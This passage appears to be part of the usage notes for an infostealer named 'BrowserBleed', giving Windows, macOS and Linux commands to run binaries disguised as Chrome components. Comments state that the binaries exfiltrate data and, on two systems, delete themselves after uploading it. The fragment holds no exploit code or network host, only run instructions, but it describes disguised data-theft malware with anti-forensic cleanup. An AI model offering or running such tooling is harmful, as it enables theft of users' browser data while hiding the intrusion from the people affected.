...
```bash
# Windows
chrome_crashpad_handler.exe   # exfils, self-deletes after upload

# macOS
sudo ./BrowserBleed_mac       # exfils, self-deletes after upload

# Linux (no self-delete — remove manually)
sudo ./google-chrome          # exfils, stays on disk
```
